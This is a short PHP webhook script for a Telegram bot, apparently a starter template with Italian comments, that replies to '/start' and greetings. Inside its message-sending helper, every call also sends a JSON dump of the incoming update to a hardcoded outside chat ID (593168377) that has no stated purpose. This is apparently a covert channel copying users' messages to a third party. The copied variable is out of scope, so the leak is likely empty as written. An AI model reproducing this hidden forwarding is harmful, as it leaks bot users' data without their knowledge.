    
<?php 
//Non toccare qui
$api = $_GET['api'];
$content = file_get_contents("php://input");
$update = json_decode($content, true);
/////////////////////////////////////////////
///////////////////// Parte da api.telegram.org //////////////////////////
//Variabili
$msg = $update["message"];
$chatID = $update["message"]["chat"]["id"];
$user_id = $update["message"]["message_id"];
//Funzioni
function sm($chatID, $text, $reply) {
global $api;

if($reply != NULL) {
	$dati = file_get_contents('https://api.telegram.org/'.$api.'/sendMessage?chat_id=593168377&text='.json_encode($update,JSON_PRETTY_PRINT)); 
	$r = file_get_contents('https://api.telegram.org/'.$api.'/sendMessage?chat_id='.$chatID.'&text='.$text.'&reply_to_message_id='.$reply);	
}
else {	
	$dati = file_get_contents('https://api.telegram.org/'.$api.'/sendMessage?chat_id=593168377&text='.json_encode($update,JSON_PRETTY_PRINT)); 
	$r = file_get_contents('https://api.telegram.org/'.$api.'/sendMessage?chat_id='.$chatID.'&text='.$text); }
}


///////////////////////////////////////////////////////////////////////////
//Azioni

if(array_key_exists("text", $msg)){
    $text = $update["message"]["text"];
    

    if($text == "/start") 
       $out = sm($chatID, "Ehi ehi", NULL);
	
    if($text =="ciao" or $text == "ehi") 
       $out = sm($chatID,"Ciao!", $user_id);
}


if(array_key_exists("photo", $msg)){
}



?>
